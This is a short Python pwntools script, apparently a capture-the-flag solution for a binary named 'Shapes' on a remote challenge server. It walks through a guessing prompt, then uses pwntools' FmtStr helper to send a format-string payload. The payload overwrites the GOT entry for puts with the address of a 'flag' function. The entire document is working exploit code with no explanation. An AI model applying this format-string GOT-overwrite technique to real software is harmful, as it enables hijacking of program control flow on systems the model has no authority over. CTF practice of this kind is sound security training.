from pwn import *
exe = context.binary = ELF("Shapes")
#io = remote("0.cloud.chals.io", "30167")
exitaddr = exe.got['puts']
winaddr = exe.symbols['flag']
def sendPayload(payload):
    io = remote("0.cloud.chals.io", "30167")
    io.recvuntil(b"(Yes/No):")
    io.sendline(b"Yes")
    io.recvuntil(b'Enter your guess: ')
    io.sendline(b"HoneyComb")
    io.recvuntil(b"(Yes/No):")
    io.sendline(b"Yes")
    io.recvuntil(b'Enter your guess: ')
    io.sendline(b"Diamond")
    io.recvuntil(b"(Yes/No):")
    io.sendline(b"Yes")
    io.recvuntil(b'Enter your guess: ')
    io.sendline(payload)
    back = io.recvuntil(b'Sorry, that\'s wrong. Try again next time.')
    return back

fmt = FmtStr(execute_fmt=sendPayload, offset=6)
fmt.write(exitaddr, winaddr)
fmt.execute_writes()